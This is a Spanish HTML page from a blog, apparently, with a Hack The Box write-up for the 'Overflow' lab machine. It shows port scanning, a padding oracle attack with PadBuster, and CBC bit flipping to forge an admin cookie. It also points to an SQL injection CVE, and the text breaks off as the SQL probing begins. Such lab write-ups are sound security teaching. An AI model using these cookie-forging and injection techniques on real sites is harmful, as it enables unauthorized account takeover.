<!doctype html><html lang="es"><head><title>Overflow | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="Hack The Box. Linux. Máquina difícil. Esta máquina contiene una página web vulnerable a Padding Oracle Attack y Bit Flipper Attack para iniciar sesión como admin y también vulnerable a SQLi por un CMS. Existe otro subdominio que usa una versión de exiftool que tiene una vulnerabilidad de RCE. Una vez en la máquina, los movimientos laterales son relativamente fáciles y la escalada de privilegios consiste en ingeniería inversa y explotación de una vulnerabilidad de Buffer Overflow en un binario SUID. Para comprometer esta máquina se necesitan conocimientos avanzados de explotación web, criptografía y explotación de binarios. En este write-up se utiliza un script en Python para efectuar un Bit Flipper Attack y un script en Ruby para SQLi"><meta itemprop="description" content="Hack The Box. Linux. Máquina difícil. Esta máquina contiene una página web vulnerable a Padding Oracle Attack y Bit Flipper Attack para iniciar sesión como admin y también vulnerable a SQLi por un CMS. Existe otro subdominio que usa una versión de exiftool que tiene una vulnerabilidad de RCE. Una vez en la máquina, los movimientos laterales son relativamente fáciles y la escalada de privilegios consiste en ingeniería inversa y explotación de una vulnerabilidad de Buffer Overflow en un binario SUID. Para comprometer esta máquina se necesitan conocimientos avanzados de explotación web, criptografía y explotación de binarios. En este write-up se utiliza un script en Python para efectuar un Bit Flipper Attack y un script en Ruby para SQLi"><meta name="twitter:card" content="Hack The Box. Linux. Máquina difícil. Esta máquina contiene una página web vulnerable a Padding Oracle Attack y Bit Flipper Attack para iniciar sesión como admin y también vulnerable a SQLi por un CMS. Existe otro subdominio que usa una versión de exiftool que tiene una vulnerabilidad de RCE. Una vez en la máquina, los movimientos laterales son relativamente fáciles y la escalada de privilegios consiste en ingeniería inversa y explotación de una vulnerabilidad de Buffer Overflow en un binario SUID. Para comprometer esta máquina se necesitan conocimientos avanzados de explotación web, criptografía y explotación de binarios. En este write-up se utiliza un script en Python para efectuar un Bit Flipper Attack y un script en Ruby para SQLi"><meta name="twitter:description" content="Hack The Box. Linux. Máquina difícil. Esta máquina contiene una página web vulnerable a Padding Oracle Attack y Bit Flipper Attack para iniciar sesión como admin y también vulnerable a SQLi por un CMS. Existe otro subdominio que usa una versión de exiftool que tiene una vulnerabilidad de RCE. Una vez en la máquina, los movimientos laterales son relativamente fáciles y la escalada de privilegios consiste en ingeniería inversa y explotación de una vulnerabilidad de Buffer Overflow en un binario SUID. Para comprometer esta máquina se necesitan conocimientos avanzados de explotación web, criptografía y explotación de binarios. En este write-up se utiliza un script en Python para efectuar un Bit Flipper Attack y un script en Ruby para SQLi"><meta property="og:description" content="Hack The Box. Linux. Máquina difícil. Esta máquina contiene una página web vulnerable a Padding Oracle Attack y Bit Flipper Attack para iniciar sesión como admin y también vulnerable a SQLi por un CMS. Existe otro subdominio que usa una versión de exiftool que tiene una vulnerabilidad de RCE. Una vez en la máquina, los movimientos laterales son relativamente fáciles y la escalada de privilegios consiste en ingeniería inversa y explotación de una vulnerabilidad de Buffer Overflow en un binario SUID. Para comprometer esta máquina se necesitan conocimientos avanzados de explotación web, criptografía y explotación de binarios. En este write-up se utiliza un script en Python para efectuar un Bit Flipper Attack y un script en Ruby para SQLi"><meta property="og:type" content="article"><meta name="robots" content="index, follow"><meta name="author" content="7Rocky"><meta name="twitter:author" content="7Rocky"><meta property="og:author" content="7Rocky"><meta name="image" content="https://7rocky.github.io/images/HTB/Overflow/Overflow.png"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/Overflow/Overflow.png"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Overflow/Overflow.png"><meta property="og:site_name" content="7Rocky"><meta itemprop="name" content="Overflow"><meta property="twitter:title" content="Overflow"><meta property="og:title" content="Overflow"><meta property="og:url" content="https://7rocky.github.io/htb/overflow/"><meta itemprop="keywords" content="cve,crypto,cronjob,suid,buffer-overflow,reversing,file-upload,file-permissions,binary-exploitation,sqli,password-reuse,rce,hash-cracking,"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/monokai-sublime.min.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/highlight.min.js"></script>
<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px"></a>
<a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/htb/overflow/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb7" role="main"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><aside aria-label="aside" class="instapaper_ignoref b helvetica tracked">HTB</aside><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/overflow/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/overflow/&text=Overflow" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/htb/overflow/&title=Overflow" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Overflow</h1><time class="f6 mv4 dib tracked" datetime="2022-04-09T00:00:00+01:00">09 / 04 / 2022</time></header><div class="htb-image"><img alt="Overflow" src="/images/HTB/Overflow/Overflow.png"></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/cve" title="CVE">CVE</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/crypto" title="Criptografía">Criptografía</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/cronjob" title="Tareas Cron">Tareas Cron</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/suid" title="Binario SUID">Binario SUID</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/buffer-overflow" title="Buffer Overflow">Buffer Overflow</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/reversing" title="Ingeniería inversa">Ingeniería inversa</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/file-upload" title="Subida de archivos">Subida de archivos</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/file-permissions" title="Permisos de archivos">Permisos de archivos</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/binary-exploitation" title="Explotación de binarios">Explotación de binarios</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/sqli" title="Inyección de código SQL">Inyección de código SQL</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/password-reuse" title="Reutilización de contraseñas">Reutilización de contraseñas</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/rce" title="Ejecución remota de comandos">Ejecución remota de comandos</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/hash-cracking" title="Descifrado de hashes de contraseñas">Descifrado de hashes de contraseñas</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem"><p class="f5 b mb3">Contenidos de este write-up</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeración-web">Enumeración web</a></li><li><a href="#acceso-como-admin">Acceso como <code>admin</code></a></li><li><a href="#encontrando-un-sqli">Encontrando un SQLi</a></li><li><a href="#explotación-de-sqli">Explotación de SQLi</a></li><li><a href="#intrusión-en-la-máquina">Intrusión en la máquina</a></li><li><a href="#movimiento-lateral-a-developer">Movimiento lateral a <code>developer</code></a></li><li><a href="#movimiento-lateral-a-tester">Movimiento lateral a <code>tester</code></a></li><li><a href="#analizando-un-binario-suid">Analizando un binario SUID</a></li><li><a href="#explotación-de-_buffer-overflow_">Explotación de <em>Buffer Overflow</em></a></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li></ul></nav></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>SO</strong>: Linux</li><li><strong>Dificultad</strong>: Difícil</li><li><strong>Dirección IP</strong>: 10.10.11.119</li><li><strong>Fecha</strong>: 23 / 10 / 2021</li></ul><h2 id="escaneo-de-puertos">Escaneo de puertos</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.119 -p 22,25,80
Nmap scan report for 10.10.11.119
Host is up (0.046s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 eb:7c:15:8f:f2:cc:d4:26:54:c1:e1:57:0d:d5:b6:7c (RSA)
|   256 d9:5d:22:85:03:de:ad:a0:df:b0:c3:00:aa:87:e8:9c (ECDSA)
|_  256 fa:ec:32:f9:47:17:60:7e:e0:ba:b6:d1:77:fb:07:7b (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: overflow, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8  
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Overflow Sec
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: Host:  overflow; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done -- 1 IP address (1 host up) scanned in 42.40 seconds
</code></pre></div><p>La máquina tiene abiertos los puertos 22 (SSH), 25 (SMTP) y 80 (HTTP).</p><h2 id="enumeración-web">Enumeración web</h2><p>Si vamos a <code>http://10.10.11.119</code> veremos una página como esta:</p><p><img src="/images/HTB/Overflow/Overflow-index.png" alt="Overflow index"></p><p>En el pie de página vemos <code>Overflow.HTB</code>. Por si acaso, vamos a poner <code>overflow.htb</code> en <code>/etc/hosts</code>. La página que muestra <code>http://overflow.htb</code> es la misma que antes.</p><p>Vamos a registrar una nueva cuenta pinchando en &ldquo;<em>Sign Up</em>&rdquo;:</p><p><img src="/images/HTB/Overflow/Overflow-register.png" alt="Overflow register"></p><p>Y luego ya tendremos una sesión:</p><p><img src="/images/HTB/Overflow/Overflow-user-access.png" alt="Overflow user access"></p><p>Existe un apartado de blog que muestra cita estas vulnerabilidades:</p><ul><li><em>Outdated Softwares</em></li><li><em>Buffer Overflows</em></li><li><em>Insecure File uploads</em></li><li><em>SQL Truncation attack</em></li></ul><h2 id="acceso-como-admin">Acceso como <code>admin</code></h2><p>Después de enumerar toda la página, realizar <em>fuzzing</em> de rutas y probar inyecciones SQL, llegamos a un punto muerto.</p><p>Sin embargo, todavía podemos probar algunos ataques en la <em>cookie</em>. Si el servidor está utilizando DES CBC para generar las <em>cookies</em>, podría ser vulnerable a <em>Padding Oracle Attack</em>. Podemos probar este ataque con <a href="https://github.com/AonCyberLabs/PadBuster"><code>PadBuster</code></a>.</p><p>Para usar <a href="https://github.com/AonCyberLabs/PadBuster"><code>PadBuster</code></a>, tenemos que poner nuestra <em>cookie</em> y el número de bytes por bloque (podemos deducir que es 8, y si no funciona, pues 16):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">perl</span> padBuster.pl http://overflow.htb 4PrZDoBliCaMXXJIg3oRxLUbV72cdBks 8 -cookie <span class="code-dark-yellow">'auth=4PrZDoBliCaMXXJIg3oRxLUbV72cdBks'</span> -encoding 0  

INFO: The original request returned the following
[+] Status: 200
[+] Location: N/A
[+] Content Length: 12227

The following response signatures were returned:

-------------------------------------------------------
ID#     Freq    Status  Length  Location
-------------------------------------------------------
1       1       200     12227   N/A
2 **    255     302     0       ../logout.php?err=1
-------------------------------------------------------

Enter an ID that matches the error condition
NOTE: The ID# marked with ** is recommended : 2

Block 1 Results:
[+] Cipher Text (HEX): 8c5d7248837a11c4
[+] Intermediate Bytes (HEX): 9589bc7cbd52fa49
[+] Plain Text: user=7ro

...

Block 2 Results:
[+] Cipher Text (HEX): b51b57bd9c74192c
[+] Intermediate Bytes (HEX): ef360b4d867f14c1
[+] Plain Text: cky

-------------------------------------------------------
** Finished ***

[+] Decrypted value (ASCII): user=7rocky
[+] Decrypted value (HEX): 757365723D37726F636B790505050505
[+] Decrypted value (Base64): dXNlcj03cm9ja3kFBQUFBQ==
</code></pre></div><p>Esta herramienta es capaz de descifrar la <em>cookie</em> y mostrarla en texto claro (<code>user=7rocky</code>). La misma herramienta puede crear una <em>cookie</em> que se descifre como <code>user=admin</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">perl</span> padBuster.pl http://overflow.htb 4PrZDoBliCaMXXJIg3oRxLUbV72cdBks 8 -cookie <span class="code-dark-yellow">'auth=4PrZDoBliCaMXXJIg3oRxLUbV72cdBks'</span> -encoding 0 -plaintext <span class="code-dark-yellow">'user=admin'</span>  

INFO: The original request returned the following
[+] Status: 302
[+] Location: home/index.php
[+] Content Length: 12227

The following response signatures were returned:

-------------------------------------------------------
ID#     Freq    Status  Length  Location
-------------------------------------------------------
1       1       200     12227   N/A
2 **    255     302     0       ../logout.php?err=1
-------------------------------------------------------

Enter an ID that matches the error condition
NOTE: The ID# marked with ** is recommended : 2

Block 2 Results:
[+] New Cipher Text (HEX): 23037825d5a1683b
[+] Intermediate Bytes (HEX): 4a6d7e23d3a76e3d

...

Block 1 Results:
[+] New Cipher Text (HEX): 0408ad19d62eba93
[+] Intermediate Bytes (HEX): 717bc86beb4fdefe

-------------------------------------------------------
** Finished ***

[+] Encrypted value is: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA
</code></pre></div><p>Y ahora tenemos una <em>cookie</em> válida para iniciar sesión como <code>admin</code>: <code>BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA</code>.</p><p>Existe otra manera de iniciar sesión como <code>admin</code>. Esta es mucho más elegante: solamente tenemos que registrar una nueva cuenta con <code>admin=</code> como nombre de usuario (de hecho, el número de <code>=</code> al final no importa).</p><p>Esto funciona porque el código PHP estará utilizando la siguiente instrucción para extraer el usuario de la <em>cookie</em> descifrada (o similar):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7">list</span><span class="mtk1">($a,</span> <span class="mtk1">$user)</span> <span class="mtk5">=</span> <span class="mtk7">explode</span><span class="mtk1">(</span><span class="mtk4">'='</span><span class="mtk1">,</span> <span class="mtk1">$decrypted_cookie);</span>  
</code></pre></div><p>Y entonces, los siguientes nombres de usuario funcionan:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">php</span> -a
Interactive mode enabled

php &gt; list($a, $user) = explode('=', 'user=admin');
php &gt; echo $user;
admin
php &gt; list($a, $user) = explode('=', 'user=admin=');
php &gt; echo $user;
admin
php &gt; list($a, $user) = explode('=', 'user=admin====');  
php &gt; echo $user;
admin
</code></pre></div><p>Y existe otra manera más de conseguir una <em>cookie</em> como usuario <code>admin</code>, que es realizando un <em>Bit Flipper Attack</em>. Este ataque se puede lanzar desde Burp Suite (Intruder), o puede ser implementado en un <em>script</em> personalizado en Python como <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Overflow/bit_flipper.py"><code>bit_flipper.py</code></a> (explicación detallada <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Overflow#bit_flipperpy">aquí</a>).</p><p>Como el servidor está usando un cifrado DES CBC (bloques de longitud 8), el esquema de descifrado es similar a este:</p><p><img src="/images/HTB/Overflow/Overflow-cbc-decryption.png" alt="CBC decryption"></p><p>La idea es registrar una cuenta como <code>`dmin</code> or <code>bdmin</code>, ya que <code>`</code> y <code>b</code> son los caracteres ASCII más cercanos a la letra <code>a</code>. Este es el resultado del <em>script</em> para ambos nombres de usuario:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> bit_flipper.py
[+] Original cookie for user `dmin: 8XriuBxV78NQchc7XKNVUHlt4qIutBEK  
[*] Bit-flip cookie for user admin: 8XriuBxU78NQchc7XKNVUHlt4qIutBEK

<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> bit_flipper.py
[+] Original cookie for user bdmin: ioRhgV7BxTW2X8oR0UTI8r92y3rKsSA3
[*] Bit-flip cookie for user admin: ioRhgV7CxTW2X8oR0UTI8r92y3rKsSA3
</code></pre></div><p>La <em>cookie</em> &ldquo;<em>Bit-flip</em>&rdquo; es muy parecida a la <em>cookie</em> original, a excepción de una letra. Por ejemplo, en la <em>cookie</em> del usuario <code>`dmin</code>, la diferencia reside en la letra <code>V</code>, que se transdorma en <code>U</code> para ontener una <em>cookie</em> válida para <code>admin</code>. Para ver la diferencia de manera correcta, las <em>cookies</em> se tienen que decodificar en Base64:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; from base64 import b64decode as b64d
&gt;&gt;&gt; b64d('8XriuBxV78NQchc7XKNVUHlt4qIutBEK').hex()  
'f17ae2b81c55efc35072173b5ca35550796de2a22eb4110a'
&gt;&gt;&gt; b64d('8XriuBxU78NQchc7XKNVUHlt4qIutBEK').hex()
'f17ae2b81c54efc35072173b5ca35550796de2a22eb4110a'
</code></pre></div><p>Aquí se ve que los dígitos hexadecimales que difieren son un <code>5</code> (<code>"0101"</code>) y un <code>4</code> (<code>"0100"</code>). Ha ocurrido un <em>flip</em> en el último bit del dígito <code>5</code>. Lo que ocurre se puede ver más o menos con la siguiente imagen:</p><p><img src="/images/HTB/Overflow/Overflow-bit-flip.jpg" alt="Bit flip"></p><p><em>Source</em>: <a href="https://resources.infosecinstitute.com/topic/cbc-byte-flipping-attack-101-approach/">https://resources.infosecinstitute.com/topic/cbc-byte-flipping-attack-101-approach/</a></p><p>No obstante, nótese que el primer bloque se tiene que descifrar como <code>user=adm</code> (bloque de longitud 8) para que sea válido, y esta vez, el <em>bit-flip</em> ocurre en el sexto byte de la <em>cookie</em> cifrada. Por tanto, la <em>cookie</em> está enviando un cierto vector inicial (<em>initial vector</em>, IV) al inicio del texto cifrado; y por tanto, el <em>bit-flip</em> se acontece en el IV, como se muestra a continuación:</p><p><img src="/images/HTB/Overflow/Overflow-bit-flip2.jpg" alt="Bit flip"></p><p>Habiendo dicho esto, podríamos habernos creado un usuario llamado <code>ZZZin</code> (<em>cookie</em> en texto claro: <code>user=ZZZin</code>) y modificar los 3 últimos bytes del IV de la <em>cookie</em> cifrada para que al descifrarla quede como <code>user=admin</code>. Y esta función especial se añadió al <em>script</em> <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Overflow/bit_flipper.py"><code>bit_flipper.py</code></a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> bit_flipper.py
[+] Original cookie for user ZZZin: eTFj72lzhNejCV3OoG4i8OUKa8gNvdbJ  
[*] Bit-flip cookie for user admin: eTFj72lIuuCjCV3OoG4i8OUKa8gNvdbJ
</code></pre></div><p>Y después de esta disertación sobre criptografía, podemos aceder como <code>admin</code>:</p><p><img src="/images/HTB/Overflow/Overflow-admin-access.png" alt="Overflow admin"></p><h2 id="encontrando-un-sqli">Encontrando un SQLi</h2><p>En este punto, podemos is a &ldquo;<em>Admin Panel</em>&rdquo;, que muestra una página de inicio de sesión en CMS Made Simple:</p><p><img src="/images/HTB/Overflow/Overflow-cms-made-simple-login.png" alt="CMS Made Simple"></p><p>Existen muchas vulnerabilidades para este CMS en ExploitDB. Una de ellas es una inyección de código SQL (CVE-2019-9053, <a href="https://www.exploit-db.com/exploits/46635"><code>46635.py</code></a>), pero el <em>exploit</em> no funciona correctamente (podría estar parcheado).</p><p>El <em>exploit</em> extrae <em>hashes</em> de la base de datos, una sal para los <em>hashes</em> y luego trata de romperlos (ya que los <em>hashes</em> son MD5).</p><p>Vamos a enumerar de nuevo la web para ver si hay alguna inyección de código SQL. Como <code>admin</code> podemos ver algunos <em>logs</em>:</p><p><img src="/images/HTB/Overflow/Overflow-admin-logs.png" alt="Overflow admin logs"></p><p>Esta información que se muestra en la ventana viene de una petición web a <code>http://overflow.htb/home/logs.php?name=admin</code> (usando AJAX).</p><p>Podemos comprobar aquí <em>payloads</em> comunes de SQLi hasta que encontramos uno que funciona (mediante un paréntesis de cierre:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span 